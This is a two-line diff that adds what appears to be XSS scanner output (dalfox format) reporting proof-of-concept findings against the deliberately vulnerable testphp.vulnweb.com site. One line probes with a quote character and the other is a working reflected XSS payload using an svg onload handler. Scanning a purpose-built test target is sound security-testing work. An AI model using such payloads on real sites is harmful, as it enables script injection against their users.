@@ -1,0 +1,2 @@
+[POC][G][GET][BUILTIN] http://testphp.vulnweb.com/listproducts.php?id=%27%27
+[POC][V][GET][inHTML-none(1)-URL] http://testphp.vulnweb.com/listproducts.php?cat=%3CsVg%2Fonload%3Dprompt%28calfcrusher%29+class%3Ddalfox%3E&id=1
